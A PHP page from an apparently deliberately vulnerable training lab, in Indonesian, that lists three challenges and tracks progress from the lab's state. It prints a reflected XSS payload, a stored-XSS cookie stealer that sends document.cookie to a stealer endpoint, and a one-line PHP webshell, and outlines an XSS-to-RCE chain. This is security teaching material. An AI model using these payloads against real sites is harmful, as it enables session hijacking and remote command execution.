<?php
require_once __DIR__ . '/../includes/functions.php';

$currentPage = 'challenge.php';
$pageTitle = 'Challenge Mode';
$pageSubtitle = '3 Level Tantangan - Buktikan Kemampuanmu';

function challengeStatus() {
    global $db;

    // Level 1: Payload XSS Reflected diedeksekusi
    $l1 = (int)$db->query("SELECT COUNT(*) FROM payload_log WHERE source = 'xss_reflected'")->fetchColumn() > 0;

    // Level 2: Cookie tertangkap oleh stealer
    $l2 = file_exists(COOKIE_LOG) && filesize(COOKIE_LOG) > 0;

    // Level 3: WebShell .php berhasil di-upload
    $phpFiles = glob(UPLOAD_DIR . '*.php');
    $l3 = is_array($phpFiles) && count($phpFiles) > 0;

    return ['l1' => $l1, 'l2' => $l2, 'l3' => $l3];
}

$st = challengeStatus();
$done = ($st['l1'] ? 1 : 0) + ($st['l2'] ? 1 : 0) + ($st['l3'] ? 1 : 0);

ob_start();
?>
<div class="card">
    <div class="card-header">
        <h3><span class="card-icon">&#128640;</span> Progress Tantangan</h3>
        <div style="display:flex;gap:10px;align-items:center;">
            <span class="badge badge-primary"><?php echo $done; ?>/3 selesai</span>
            <a href="/reset-lab.php" class="btn btn-danger">&#8635; Reset &amp; Mulai Ulang</a>
        </div>
    </div>
    <div class="card-body">
        <div style="height:10px;background:rgba(10,14,26,.6);border:1px solid var(--border);border-radius:6px;overflow:hidden;">
            <div style="height:100%;width:<?php echo ($done / 3) * 100; ?>%;background:linear-gradient(90deg,var(--primary),var(--success));transition:width .4s;"></div>
        </div>
        <p class="small text-muted" style="margin-top:8px;">
            Status dihitung dari kondisi lab secara live &mdash; bukan disimpan. Payload dieksekusi = Level 1, cookie tertangkap = Level 2, shell ter-upload = Level 3.
        </p>
    </div>
</div>

<div class="challenge-card <?php echo $st['l1'] ? 'completed' : ''; ?>">
    <div class="challenge-level l1">LEVEL 1 &mdash; BASIC</div>
    <div style="display:flex;justify-content:space-between;gap:10px;">
        <h3 style="font-size:16px;color:#fff;">Temukan &amp; Eksekusi XSS Reflected</h3>
        <span class="badge <?php echo $st['l1'] ? 'badge-success' : 'badge-warning'; ?>">
            <?php echo $st['l1'] ? '&#10004; Selesai' : 'Pending'; ?>
        </span>
    </div>
    <p class="small text-muted" style="margin:10px 0;line-height:1.6;">
        Buka <code>/xss/reflected.php</code> pada mode <strong>Vulnerable</strong> dan kirim payload yang
        dieksekusi browser (mis. <code>&lt;script&gt;alert('pwned')&lt;/script&gt;</code> pada kolom pencarian).
        Servernya mencatat payload yang terlihat "mencurigakan".
    </p>
    <a href="/xss/reflected.php" class="btn btn-outline">Buka Halaman XSS</a>
</div>

<div class="challenge-card <?php echo $st['l2'] ? 'completed' : ''; ?>">
    <div class="challenge-level l2">LEVEL 2 &mdash; INTERMEDIATE</div>
    <div style="display:flex;justify-content:space-between;gap:10px;">
        <h3 style="font-size:16px;color:#fff;">Curi Cookie Session</h3>
        <span class="badge <?php echo $st['l2'] ? 'badge-success' : 'badge-warning'; ?>">
            <?php echo $st['l2'] ? '&#10004; Selesai' : 'Pending'; ?>
        </span>
    </div>
    <p class="small text-muted" style="margin:10px 0;line-height:1.6;">
        Kombinasikan <strong>Stored XSS</strong> dengan endpoint <code>/steal-cookie.php</code>.
        Kirim payload yang menghasilkan request ke stealer membawa <code>document.cookie</code>:
    </p>
    <div class="terminal"><?php echo e("<script>fetch('/steal-cookie.php?c='+document.cookie)</script>"); ?></div>
    <p class="small text-muted" style="margin-top:10px;">Setelah itu cek hasil tangkapan di Dashboard &gt; Cookie yang Ditangkap.</p>
    <div style="display:flex;gap:10px;margin-top:10px;">
        <a href="/xss/stored.php" class="btn btn-outline">Buka Halaman Komentar</a>
        <a href="/dashboard.php" class="btn btn-outline">&#127891; Lihat Cookie</a>
    </div>
</div>

<div class="challenge-card <?php echo $st['l3'] ? 'completed' : ''; ?>">
    <div class="challenge-level l3">LEVEL 3 &mdash; ADVANCED</div>
    <div style="display:flex;justify-content:space-between;gap:10px;">
        <h3 style="font-size:16px;color:#fff;">Dapatkan Shell via File Upload</h3>
        <span class="badge <?php echo $st['l3'] ? 'badge-success' : 'badge-warning'; ?>">
            <?php echo $st['l3'] ? '&#10004; Selesai' : 'Pending'; ?>
        </span>
    </div>
    <p class="small text-muted" style="margin:10px 0;line-height:1.6;">
        Buat file <code>shell.php</code> berisi <code>&lt;?php system($_GET['cmd']); ?&gt;</code>,
        upload di mode <strong>Vulnerable</strong> pada <code>/rce/upload.php</code>, kemudian eksekusi.
    </p>
    <a href="/rce/upload.php" class="btn btn-outline">Buka Halaman Upload</a>
</div>

<div class="card">
    <div class="card-header">
        <h3><span class="card-icon">&#128295;</span> Alur Serangan Lengkap (XSS to RCE)</h3>
    </div>
    <div class="card-body">
        <div class="terminal">
            <div class="terminal-header"><span class="terminal-dot" style="background:#ff4757;"></span><span class="terminal-dot" style="background:#ffa502;"></span><span class="terminal-dot" style="background:#00ff88;"></span></div>
            <strong>1. Reflected XSS</strong>  &rarr;  konfirmasi injeksi &amp; dapatkan domain
            <strong>2. Stored XSS + Cookie Stealer</strong>  &rarr;  curi session admin
            <strong>3. Replay session</strong>  &rarr;  akses dashboard sebagai admin
            <strong>4. File Upload</strong>  &rarr;  upload webshell .php
            <strong>5. Command Injection</strong>  &rarr;  dukungan tambahan untuk eksekusi
            <strong>6. Eval Injection</strong>  &rarr;  jalankan kode PHP secara langsung
        </div>
    </div>
</div>
<?php
$content = ob_get_clean();
require __DIR__ . '/../includes/layout.php';